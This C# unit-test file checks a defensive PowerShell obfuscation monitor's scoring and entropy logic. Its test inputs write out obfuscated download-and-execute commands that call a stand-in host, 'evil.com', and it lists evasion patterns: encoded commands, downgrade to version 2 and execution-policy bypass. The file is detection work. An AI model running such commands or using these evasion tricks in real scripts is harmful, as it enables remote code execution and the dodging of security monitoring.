using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using Xunit;

namespace Sentinel.Tests.Monitors
{
    /// <summary>
    /// Tests for ScriptHardeningMonitor - verifies obfuscation scoring,
    /// Shannon entropy calculation, and detection of known evasion patterns.
    /// </summary>
    public class ScriptHardeningMonitorTests
    {
        // 
        // Obfuscation scoring (re-implementation of private CalculateObfuscationScore)
        // 

        [Fact]
        public void ObfuscationScore_CleanScript_ScoresZero()
        {
            var script = "Write-Host 'Hello World'\nGet-Process | Where-Object { $_.CPU -gt 100 }";
            var score = CalculateObfuscationScore(script);
            Assert.Equal(0, score);
        }

        [Fact]
        public void ObfuscationScore_BacktickObfuscation_Scores()
        {
            // Powershell backtick evasion: `I`E`X, `N`e`w`-`O`b`j`e`c`t
            var script = "`I`E`X (`N`e`w`-`O`b`j`e`c`t `N`e`t`.`W`e`b`C`l`i`e`n`t).`D`o`w`n`l`o`a`d`S`t`r`i`n`g('http://evil.com')";
            var score = CalculateObfuscationScore(script);
            Assert.True(score >= 2, $"Expected >=2 for backtick obfuscation, got {score}");
        }

        [Fact]
        public void ObfuscationScore_StringConcatenation_Scores()
        {
            // Character concatenation: 'I'+'E'+'X'
            var script = "$x = 'I'+'E'+'X'; & $x (New-Object Net.WebClient).DownloadString('http://evil.com')";
            var score = CalculateObfuscationScore(script);
            Assert.True(score >= 1, $"Expected >=1 for string concat, got {score}");
        }

        [Fact]
        public void ObfuscationScore_CharArrayObfuscation_Scores()
        {
            // Char code: [char]73+[char]69+[char]88 = IEX
            var script = "& ([char]73+[char]69+[char]88 -join '') (something)";
            var score = CalculateObfuscationScore(script);
            Assert.True(score >= 2, $"Expected >=2 for char array, got {score}");
        }

        [Fact]
        public void ObfuscationScore_ReverseString_Scores()
        {
            // Reverse: -join('xei'[-1..-3]) = iex
            var script = "& (-join('xei'[-1..-3])) (some-payload)";
            var score = CalculateObfuscationScore(script);
            Assert.True(score >= 2, $"Expected >=2 for reverse string, got {score}");
        }

        [Fact]
        public void ObfuscationScore_MultipleReplace_Scores()
        {
            var script = "$a = 'AAAA' -replace 'A','I' -replace 'I','E' -replace 'E','X' -replace 'Y','Z' -replace 'Q','W'";
            var score = CalculateObfuscationScore(script);
            Assert.True(score >= 1, $"Expected >=1 for replace abuse, got {score}");
        }

        [Fact]
        public void ObfuscationScore_CombinedObfuscation_ScoresHigh()
        {
            // Multiple techniques combined
            var script = @"
                `I`E`X (`N`e`w`-`O`b`j`e`c`t `N`e`t`.`W`e`b`C`l`i`e`n`t).`D`o`w`n`l`o`a`d`S`t`r`i`n`g(
                    ('moc.live//' + 'ptth' -replace 'moc','com' -replace '//', '://' -replace 'ptth', 'http')
                    -replace 'x','y' -replace 'y','z' -replace 'z','a' -replace 'a','b' -replace 'b','c'
                )
                & (-join('xei'[-1..-3])) ${" + new string('a', 10) + @"}";
            var score = CalculateObfuscationScore(script);
            Assert.True(score >= 5, $"Expected >=5 for combined obfuscation, got {score}");
        }

        [Fact]
        public void ObfuscationScore_MaxIsTen()
        {
            // Even with extreme obfuscation, score caps at 10
            var script = @"
                `I`E`X `N`e`w `O`b`j`e`c`t `I`E`X `N`e`w `O`b`j`e`c`t `N`e`t
                'I'+'E'+'X'+'I'+'E'+'X'
                [char]73+[char]69+[char]88+[char]73+[char]69+[char]88
                '{0}{1}' -f 'I','E'
                -join('xei'[-1..-3])
                -replace 'a','b' -replace 'c','d' -replace 'e','f' -replace 'g','h' -replace 'i','j'
                ${abcdef01234567890}
            ";
            var score = CalculateObfuscationScore(script);
            Assert.True(score <= 10, $"Score {score} exceeds max of 10");
        }

        // 
        // Shannon entropy calculation
        // 

        [Fact]
        public void ShannonEntropy_EmptyString_ReturnsZero()
        {
            Assert.Equal(0.0, CalculateShannonEntropy(""));
        }

        [Fact]
        public void ShannonEntropy_SingleChar_ReturnsZero()
        {
            Assert.Equal(0.0, CalculateShannonEntropy("aaaaaaa"));
        }

        [Fact]
        public void ShannonEntropy_HighEntropyBase64_AboveFive()
        {
            // Random bytes produce high entropy base64
            var rng = new System.Random(42);
            var randomBytes = new byte[100];
            rng.NextBytes(randomBytes);
            var base64 = Convert.ToBase64String(randomBytes);
            var entropy = CalculateShannonEntropy(base64);
            Assert.True(entropy > 4.0, $"Expected >4.0 for random base64, got {entropy}");
        }

        [Fact]
        public void ShannonEntropy_NaturalLanguage_ModerateEntropy()
        {
            var text = "The quick brown fox jumps over the lazy dog";
            var entropy = CalculateShannonEntropy(text);
            Assert.True(entropy > 3.0 && entropy < 5.0,
                $"Expected 3.0-5.0 for natural language, got {entropy}");
        }

        [Fact]
        public void ShannonEntropy_BinaryData_HighEntropy()
        {
            // Random-looking data should have high entropy
            var data = "aB3$kL9#mN2@pQ7!rS5&uV1*wX8^yZ4";
            var entropy = CalculateShannonEntropy(data);
            Assert.True(entropy > 4.5, $"Expected >4.5 for random chars, got {entropy}");
        }

        // 
        // PowerShell evasion detection patterns
        // 

        [Theory]
        [InlineData("-encodedcommand")]
        [InlineData("-EncodedCommand")]
        [InlineData("-enc")]
        [InlineData("-e")]
        public void EncodedCommand_FlagsDetected(string flag)
        {
            // These PowerShell flags indicate encoded command execution
            var cmdLine = $"powershell.exe {flag} SQBFAFgAIAAoACgATgBl...";
            Assert.Contains(flag, cmdLine, StringComparison.OrdinalIgnoreCase);
        }

        [Theory]
        [InlineData("powershell.exe -version 2")]
        [InlineData("powershell.exe -Version 2.0")]
        public void PowerShellDowngrade_Patterns(string cmdLine)
        {
            // v2 downgrade bypasses AMSI, ScriptBlock logging, and CLM
            Assert.Matches(@"-[Vv]ersion\s+2", cmdLine);
        }

        [Theory]
        [InlineData("powershell.exe -ep bypass")]
        [InlineData("powershell.exe -ExecutionPolicy Bypass")]
        [InlineData("powershell.exe -exec bypass")]
        public void ExecutionPolicyBypass_Patterns(string cmdLine)
        {
            Assert.Matches(@"-[Ee](xecutionPolicy|xec|p)\s+[Bb]ypass", cmdLine);
        }

        // 
        // Helper re-implementations for testing private logic
        // 

        private static readonly Regex TickObfuscation = new(@"`[A-Za-z]", RegexOptions.Compiled);
        private static readonly Regex ConcatObfuscation = new(@"'[A-Za-z]'\s*\+\s*'[A-Za-z]'", RegexOptions.Compiled);
        private static readonly Regex CharArrayObfuscation = new(@"\[char\]\d+\s*\+\s*\[char\]\d+", RegexOptions.Compiled | RegexOptions.IgnoreCase);
        private static readonly Regex FormatStringObfuscation = new(@"""\{0\}\{1\}""\s*-f\s*'", RegexOptions.Compiled);
        private static readonly Regex ReverseObfuscation = new(@"-join\(.+\[-1\.\.-\d+\]\)", RegexOptions.Compiled);

        private static int CalculateObfuscationScore(string script)
        {
            int score = 0;

            int tickCount = TickObfuscation.Matches(script).Count;
            if (tickCount >= 10) score += 2;
            else if (tickCount >= 5) score += 1;

            if (ConcatObfuscation.IsMatch(script)) score += 2;
            if (CharArrayObfuscation.IsMatch(script)) score += 2;
            if (FormatStringObfuscation.IsMatch(script)) score += 1;
            if (ReverseObfuscation.IsMatch(script)) score += 2;

            if (script.Length > 100)
            {
                var entropy = CalculateShannonEntropy(script[..Math.Min(500, script.Length)]);
                if (entropy > 5.5) score += 1;
            }

            int replaceCount = Regex.Matches(script, @"-replace|\.replace\(", RegexOptions.IgnoreCase).Count;
            if (replaceCount >= 5) score += 1;

            if (Regex.IsMatch(script, @"\$\{[a-f0-9]{8,}\}", RegexOptions.IgnoreCase)) score += 1;

            return Math.Min(score, 10);
        }

        private static double CalculateShannonEntropy(string s)
        {
            if (string.IsNullOrEmpty(s)) return 0;
            var freq = new Dictionary<char, int>();
            foreach (var c in s)
            {
                if (!freq.ContainsKey(c)) freq[c] = 0;
                freq[c]++;
            }
            double entropy = 0;
            double len = s.Length;
            foreach (var count in freq.Values)
            {
                double p = count / len;
                entropy -= p * Math.Log(p, 2);
            }
            return entropy;
        }
    }
}
